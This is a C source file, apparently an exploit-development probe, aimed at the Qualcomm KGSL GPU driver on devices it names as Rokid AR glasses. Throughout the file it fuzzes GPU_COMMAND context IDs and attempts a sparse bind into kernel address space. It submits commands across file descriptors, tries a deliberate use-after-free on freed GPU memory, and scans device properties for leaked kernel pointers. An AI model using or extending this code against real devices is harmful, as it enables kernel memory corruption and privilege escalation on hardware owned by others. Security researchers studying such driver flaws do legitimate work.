/*
 * KGSL GPU Command Exploitation
 * ==============================
 *
 * GPU_COMMAND IOCTL (0xc0580940) accepts garbage data!
 * This is the main GPU submission interface and may allow:
 * 1. GPU command buffer injection
 * 2. Arbitrary memory access via GPU
 * 3. Kernel structure corruption
 *
 * Compile:
 * aarch64-linux-android31-clang -static -O2 -pthread -o kgsl_gpu_cmd kgsl_gpu_cmd.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <sched.h>

// ============================================================================
// KGSL Definitions
// ============================================================================

#define IOCTL_KGSL_GPUMEM_ALLOC 0xc018092f
#define IOCTL_KGSL_GPUMEM_FREE 0x40080910
#define IOCTL_KGSL_GPU_COMMAND 0xc0580940
#define IOCTL_KGSL_DRAWCTXT_CREATE 0xc0100913
#define IOCTL_KGSL_DRAWCTXT_DESTROY 0x40080914
#define IOCTL_KGSL_DEVICE_GETPROPERTY 0xc0100902
#define IOCTL_KGSL_GPUOBJ_INFO 0xc0200939
#define IOCTL_KGSL_GPUOBJ_SET_INFO 0xc018093a
#define IOCTL_KGSL_GPUOBJ_IMPORT 0xc0280958
#define IOCTL_KGSL_GPUOBJ_SYNC 0xc0180956
#define IOCTL_KGSL_SPARSE_BIND 0xc0280957
#define IOCTL_KGSL_TIMESTAMP_EVENT 0xc010090e

// GPU command flags
#define KGSL_CMDFLAGS_NONE 0
#define KGSL_CMDFLAGS_PMODE 0x00000001
#define KGSL_CMDFLAGS_CTX_SWITCH 0x00000008
#define KGSL_CMDFLAGS_SYNC 0x00000040
#define KGSL_CMDFLAGS_PROFILE 0x00000080
#define KGSL_CMDFLAGS_PWRON_FIXUP 0x00000100
#define KGSL_CMDFLAGS_SKIP 0x00000200

// Object types
#define KGSL_GPUOBJ_TYPE_COMMAND 0
#define KGSL_GPUOBJ_TYPE_MEMOBJ 1
#define KGSL_GPUOBJ_TYPE_SYNCPOINT 2
#define KGSL_GPUOBJ_TYPE_SPARSEOBJ 3

// ============================================================================
// Structures
// ============================================================================

struct gpumem_alloc_req
{
    uint64_t gpuaddr;
    uint64_t size;
    uint32_t flags;
    uint32_t padding;
};

struct kgsl_gpumem_free
{
    uint64_t gpuaddr;
};

struct kgsl_device_getproperty
{
    uint32_t type;
    void *value;
    uint32_t sizebytes;
};

struct kgsl_drawctxt_create
{
    uint32_t flags;
    uint32_t drawctxt_id;
};

struct kgsl_drawctxt_destroy
{
    uint32_t drawctxt_id;
    uint32_t padding;
};

// GPU command structures (reverse engineered)
struct kgsl_command_object
{
    uint64_t gpuaddr;
    uint64_t size;
    uint32_t flags;
    uint32_t id;
};

struct kgsl_command_syncpoint
{
    uint64_t gpuaddr;
    uint64_t size;
    uint32_t flags;
    uint32_t id;
};

// Main GPU_COMMAND structure (88 bytes = 0x58)
struct kgsl_gpu_command
{
    uint64_t flags;      // 0x00
    uint64_t cmdlist;    // 0x08 - pointer to command objects
    uint64_t cmdsize;    // 0x10
    uint64_t objlist;    // 0x18 - pointer to memory objects
    uint64_t objsize;    // 0x20
    uint64_t synclist;   // 0x28 - pointer to sync objects
    uint64_t syncsize;   // 0x30
    uint32_t context_id; // 0x38
    uint32_t numcmds;    // 0x3c
    uint32_t numobjs;    // 0x40
    uint32_t numsyncs;   // 0x44
    uint32_t timestamp;  // 0x48
    uint32_t result;     // 0x4c
    uint64_t result_ts;  // 0x50
};

struct kgsl_gpuobj_info
{
    uint64_t gpuaddr;
    uint64_t padding;
    uint64_t size;
    uint64_t va_addr;
    uint64_t va_len;
    uint32_t id;
    uint32_t flags;
};

struct kgsl_gpuobj_set_info
{
    uint64_t flags;
    uint64_t gpuaddr;
    uint64_t size;
    uint32_t id;
    uint32_t type;
    uint32_t padding;
    uint32_t metadata;
};

// ============================================================================
// Globals
// ============================================================================

static sigjmp_buf jmp_env;
static volatile sig_atomic_t sig_received = 0;

int kgsl_fd = -1;
uint64_t gpu_base = 0;
void *gpu_map = NULL;

// ============================================================================
// Helpers
// ============================================================================

void sig_handler(int sig)
{
    sig_received = sig;
    siglongjmp(jmp_env, 1);
}

int safe_read64(void *ptr, uint64_t *out)
{
    sig_received = 0;
    if (sigsetjmp(jmp_env, 1) == 0)
    {
        *out = *(volatile uint64_t *)ptr;
        return 0;
    }
    return -1;
}

void hexdump(const char *desc, const void *data, size_t size)
{
    const uint8_t *p = (const uint8_t *)data;
    printf("%s:\n", desc);
    for (size_t i = 0; i < size && i < 256; i++)
    {
        if (i % 32 == 0)
            printf("  %04zx: ", i);
        printf("%02x", p[i]);
        if ((i + 1) % 32 == 0)
            printf("\n");
        else if ((i + 1) % 8 == 0)
            printf(" ");
    }
    if (size % 32 != 0)
        printf("\n");
}

int alloc_gpu_mem(uint64_t *addr, size_t size)
{
    struct gpumem_alloc_req alloc = {0};
    alloc.size = size;
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC, &alloc) < 0)
    {
        return -1;
    }
    *addr = alloc.gpuaddr;
    return 0;
}

void *map_gpu_mem(uint64_t gpuaddr, size_t size)
{
    uint64_t page_idx = (gpuaddr - 0x4000000000ULL) / 0x1000;
    uint64_t offset = (page_idx + 1) * 0x1000;
    return mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, kgsl_fd, offset);
}

// ============================================================================
// Test 1: GPU_COMMAND Structure Exploration
// ============================================================================

void test_gpu_command_struct(void)
{
    printf("\n=== Test 1: GPU_COMMAND Structure Exploration ===\n");

    // Allocate command buffer
    uint64_t cmd_buf_addr;
    if (alloc_gpu_mem(&cmd_buf_addr, 0x10000) < 0)
    {
        printf("[-] Cannot allocate command buffer\n");
        return;
    }
    printf("[+] Command buffer at 0x%lx\n", cmd_buf_addr);

    void *cmd_map = map_gpu_mem(cmd_buf_addr, 0x10000);
    if (cmd_map == MAP_FAILED)
    {
        printf("[-] Cannot map command buffer\n");
        return;
    }

    // Initialize command buffer with GPU commands
    // These are Adreno GPU commands (PM4 format)
    uint32_t *cmds = (uint32_t *)cmd_map;
    int idx = 0;

    // NOP packet
    cmds[idx++] = 0x80000000 | (16 - 1); // Type 0 NOP with 16 dwords
    for (int i = 0; i < 15; i++)
    {
        cmds[idx++] = 0;
    }

    // Create command object array
    struct kgsl_command_object cmd_obj = {0};
    cmd_obj.gpuaddr = cmd_buf_addr;
    cmd_obj.size = idx * 4;
    cmd_obj.flags = 0;
    cmd_obj.id = 0;

    // Test GPU_COMMAND with various configurations
    struct kgsl_gpu_command gpu_cmd = {0};
    gpu_cmd.flags = 0;
    gpu_cmd.cmdlist = (uint64_t)&cmd_obj;
    gpu_cmd.cmdsize = sizeof(cmd_obj);
    gpu_cmd.numcmds = 1;
    gpu_cmd.context_id = 0; // Invalid context

    printf("[*] Testing GPU_COMMAND with context_id=0\n");
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd);
    printf("    ret=%d errno=%d (%s)\n", ret, errno, strerror(errno));
    printf("    result=%u timestamp=%u\n", gpu_cmd.result, gpu_cmd.timestamp);

    // Try with different context IDs
    for (uint32_t ctx = 1; ctx <= 100; ctx++)
    {
        gpu_cmd.context_id = ctx;
        ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd);
        if (ret == 0)
        {
            printf("[!!!] GPU_COMMAND succeeded with context_id=%u!\n", ctx);
            printf("      result=%u timestamp=%u\n", gpu_cmd.result, gpu_cmd.timestamp);
            break;
        }
    }

    munmap(cmd_map, 0x10000);
}

// ============================================================================
// Test 2: GPUOBJ_INFO Exploration
// ============================================================================

void test_gpuobj_info(void)
{
    printf("\n=== Test 2: GPUOBJ_INFO Exploration ===\n");

    // Try to get info on various GPU object IDs
    for (uint32_t id = 1; id <= 100; id++)
    {
        struct kgsl_gpuobj_info info = {0};
        info.id = id;

        int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
        if (ret == 0)
        {
            printf("[+] ID %u: gpuaddr=0x%lx size=0x%lx va_addr=0x%lx flags=0x%x\n",
                   id, info.gpuaddr, info.size, info.va_addr, info.flags);
        }
    }
}

// ============================================================================
// Test 3: GPU Object Set Info
// ============================================================================

void test_gpuobj_set_info(void)
{
    printf("\n=== Test 3: GPUOBJ_SET_INFO Exploration ===\n");

    // Allocate an object first
    uint64_t obj_addr;
    if (alloc_gpu_mem(&obj_addr, 0x1000) < 0)
    {
        printf("[-] Cannot allocate\n");
        return;
    }
    printf("[+] Object at 0x%lx\n", obj_addr);

    // Try to set metadata
    struct kgsl_gpuobj_set_info set_info = {0};
    set_info.gpuaddr = obj_addr;
    set_info.size = 0x1000;
    set_info.type = 0;
    set_info.metadata = 0x41414141;

    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_SET_INFO, &set_info);
    printf("[*] set_info ret=%d errno=%d\n", ret, errno);

    // Now query it
    struct kgsl_gpuobj_info info = {0};
    info.gpuaddr = obj_addr;
    ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    printf("[*] info ret=%d: id=%u flags=0x%x\n", ret, info.id, info.flags);
}

// ============================================================================
// Test 4: KGSL Sparse Bind
// ============================================================================

struct kgsl_sparse_bind
{
    uint64_t virtaddr;
    uint64_t size;
    uint64_t poffset;
    uint64_t flags;
    uint32_t id;
    uint32_t cmd;
    uint64_t physaddr;
};

#define KGSL_SPARSE_BIND 1
#define KGSL_SPARSE_UNBIND 2

void test_sparse_bind(void)
{
    printf("\n=== Test 4: Sparse Bind ===\n");

    // Try to bind arbitrary virtual address
    struct kgsl_sparse_bind bind = {0};
    bind.virtaddr = 0xFFFFFFFC00000000ULL; // Kernel address space
    bind.size = 0x1000;
    bind.poffset = 0;
    bind.flags = 0;
    bind.id = 1;
    bind.cmd = KGSL_SPARSE_BIND;
    bind.physaddr = gpu_base; // Our GPU allocation

    int ret = ioctl(kgsl_fd, IOCTL_KGSL_SPARSE_BIND, &bind);
    printf("[*] sparse_bind to kernel space: ret=%d errno=%d\n", ret, errno);

    // Try with GPU address
    bind.virtaddr = 0x4000100000ULL; // Higher GPU address
    ret = ioctl(kgsl_fd, IOCTL_KGSL_SPARSE_BIND, &bind);
    printf("[*] sparse_bind to GPU space: ret=%d errno=%d\n", ret, errno);
}

// ============================================================================
// Test 5: GPU Memory Import
// ============================================================================

struct kgsl_gpuobj_import
{
    uint64_t priv;
    uint64_t priv_len;
    uint64_t flags;
    uint32_t type;
    uint32_t id;
    uint64_t gpuaddr;
};

#define KGSL_USER_MEM_TYPE_DMABUF 2
#define KGSL_USER_MEM_TYPE_ION 3
#define KGSL_USER_MEM_TYPE_ADDR 4

void test_gpuobj_import(void)
{
    printf("\n=== Test 5: GPU Object Import ===\n");

    // Try to import various memory types
    uint64_t fake_priv = 0x4141414141414141ULL;

    struct kgsl_gpuobj_import import_req = {0};
    import_req.priv = (uint64_t)&fake_priv;
    import_req.priv_len = sizeof(fake_priv);
    import_req.flags = 0;
    import_req.type = KGSL_USER_MEM_TYPE_ADDR;

    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &import_req);
    printf("[*] import type ADDR: ret=%d errno=%d\n", ret, errno);
    if (ret == 0)
    {
        printf("[!!!] Import succeeded! gpuaddr=0x%lx id=%u\n",
               import_req.gpuaddr, import_req.id);
    }

    // Try with dmabuf type (fake fd)
    import_req.type = KGSL_USER_MEM_TYPE_DMABUF;
    import_req.priv = 3; // A valid fd number
    import_req.priv_len = 0;
    ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &import_req);
    printf("[*] import type DMABUF: ret=%d errno=%d\n", ret, errno);
}

// ============================================================================
// Test 6: Cross-FD GPU Command Injection
// ============================================================================

void test_crossfd_gpu_command(void)
{
    printf("\n=== Test 6: Cross-FD GPU Command Injection ===\n");

    // Open second fd
    int fd2 = open("/dev/kgsl-3d0", O_RDWR);
    if (fd2 < 0)
    {
        printf("[-] Cannot open fd2\n");
        return;
    }

    // Allocate on fd2
    struct gpumem_alloc_req alloc2 = {0};
    alloc2.size = 0x10000;
    if (ioctl(fd2, IOCTL_KGSL_GPUMEM_ALLOC, &alloc2) < 0)
    {
        printf("[-] Alloc on fd2 failed\n");
        close(fd2);
        return;
    }
    printf("[+] fd2 allocation at 0x%lx\n", alloc2.gpuaddr);

    // Map from fd2
    void *map2 = map_gpu_mem(alloc2.gpuaddr, 0x10000);
    if (map2 == MAP_FAILED)
    {
        // Try alternate mapping
        map2 = mmap(NULL, 0x10000, PROT_READ | PROT_WRITE, MAP_SHARED, fd2, 0);
    }

    if (map2 != MAP_FAILED)
    {
        // Write command to fd2's memory
        uint32_t *cmds = (uint32_t *)map2;
        cmds[0] = 0x80000000 | 7; // NOP with 8 dwords
        cmds[1] = 0xDEADBEEF;

        printf("[+] Wrote commands to fd2's buffer\n");

        // Now try to submit from fd1 using fd2's gpuaddr
        struct kgsl_command_object cmd_obj = {0};
        cmd_obj.gpuaddr = alloc2.gpuaddr; // fd2's address!
        cmd_obj.size = 32;
        cmd_obj.flags = 0;

        struct kgsl_gpu_command gpu_cmd = {0};
        gpu_cmd.cmdlist = (uint64_t)&cmd_obj;
        gpu_cmd.cmdsize = sizeof(cmd_obj);
        gpu_cmd.numcmds = 1;
        gpu_cmd.context_id = 0;

        int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd);
        printf("[*] Cross-FD GPU_COMMAND: ret=%d errno=%d\n", ret, errno);

        munmap(map2, 0x10000);
    }

    // Free and close fd2, but keep using its address
    struct kgsl_gpumem_free free_req = {0};
    free_req.gpuaddr = alloc2.gpuaddr;
    ioctl(fd2, IOCTL_KGSL_GPUMEM_FREE, &free_req);
    close(fd2);

    printf("[+] Closed fd2, attempting UAF...\n");

    // Now try to use the freed address
    struct kgsl_command_object cmd_obj = {0};
    cmd_obj.gpuaddr = alloc2.gpuaddr; // Freed address!
    cmd_obj.size = 32;

    struct kgsl_gpu_command gpu_cmd = {0};
    gpu_cmd.cmdlist = (uint64_t)&cmd_obj;
    gpu_cmd.cmdsize = sizeof(cmd_obj);
    gpu_cmd.numcmds = 1;
    gpu_cmd.context_id = 0;

    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd);
    printf("[*] UAF GPU_COMMAND: ret=%d errno=%d\n", ret, errno);
}

// ============================================================================
// Test 7: Property-based Info Leak
// ============================================================================

void test_property_info_leak(void)
{
    printf("\n=== Test 7: Property-based Info Leak ===\n");

    uint8_t buf[256];

    // Scan all property types
    for (uint32_t prop = 0; prop <= 0x50; prop++)
    {
        memset(buf, 0, sizeof(buf));

        struct kgsl_device_getproperty get = {0};
        get.type = prop;
        get.value = buf;
        get.sizebytes = sizeof(buf);

        int ret = ioctl(kgsl_fd, IOCTL_KGSL_DEVICE_GETPROPERTY, &get);
        if (ret == 0)
        {
            // Check for kernel pointers
            uint64_t *vals = (uint64_t *)buf;
            int has_kptr = 0;
            for (int i = 0; i < 32; i++)
            {
                if ((vals[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFC000000000ULL ||
                    (vals[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFF8000000000ULL)
                {
                    has_kptr = 1;
                    break;
                }
            }

            if (has_kptr)
            {
                printf("[!!!] Property 0x%02x has kernel pointer!\n", prop);
                hexdump("Data", buf, 64);
            }
            else
            {
                // Check for non-zero data
                int non_zero = 0;
                for (int i = 0; i < 256; i++)
                {
                    if (buf[i] != 0)
                        non_zero++;
                }
                if (non_zero > 8)
                {
                    printf("[+] Property 0x%02x: %d non-zero bytes\n", prop, non_zero);
                }
            }
        }
    }
}

// ============================================================================
// Test 8: Check GPU Registers
// ============================================================================

void test_gpu_registers(void)
{
    printf("\n=== Test 8: GPU Register Access ===\n");

    // Property 2 is DEVICE_SHADOW which contains GPU register info
    struct
    {
        uint64_t hostptr;
        uint64_t size;
        uint32_t flags;
        uint32_t padding;
    } shadow_info = {0};

    struct kgsl_device_getproperty get = {0};
    get.type = 0x02; // KGSL_PROP_DEVICE_SHADOW
    get.value = &shadow_info;
    get.sizebytes = sizeof(shadow_info);

    int ret = ioctl(kgsl_fd, IOCTL_KGSL_DEVICE_GETPROPERTY, &get);
    printf("[*] Device shadow: ret=%d\n", ret);
    if (ret == 0)
    {
        printf("[+] hostptr=0x%lx size=0x%lx flags=0x%x\n",
               shadow_info.hostptr, shadow_info.size, shadow_info.flags);

        // Try to map this if it looks like a valid ptr
        if (shadow_info.hostptr != 0)
        {
            printf("[!!!] Shadow hostptr looks valid - potential info leak!\n");
        }
    }
}

// ============================================================================
// Main
// ============================================================================

int main(int argc, char **argv)
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║  KGSL GPU Command Exploitation                                ║\n");
    printf("║  Target: Rokid AR Glasses                                     ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n\n");

    signal(SIGSEGV, sig_handler);
    signal(SIGBUS, sig_handler);

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0)
    {
        printf("[-] Cannot open /dev/kgsl-3d0: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] kgsl_fd = %d\n", kgsl_fd);

    // Make initial allocation
    if (alloc_gpu_mem(&gpu_base, 0x1000) < 0)
    {
        printf("[-] Initial alloc failed\n");
        return 1;
    }
    printf("[+] Base allocation at 0x%lx\n", gpu_base);

    gpu_map = map_gpu_mem(gpu_base, 0x1000);
    if (gpu_map != MAP_FAILED)
    {
        printf("[+] Mapped at %p\n", gpu_map);
    }

    // Run tests
    test_gpu_command_struct();
    test_gpuobj_info();
    test_gpuobj_set_info();
    test_sparse_bind();
    test_gpuobj_import();
    test_crossfd_gpu_command();
    test_property_info_leak();
    test_gpu_registers();

    // Cleanup
    if (gpu_map != MAP_FAILED)
        munmap(gpu_map, 0x1000);
    close(kgsl_fd);

    printf("\n=== All Tests Complete ===\n");
    return 0;
}
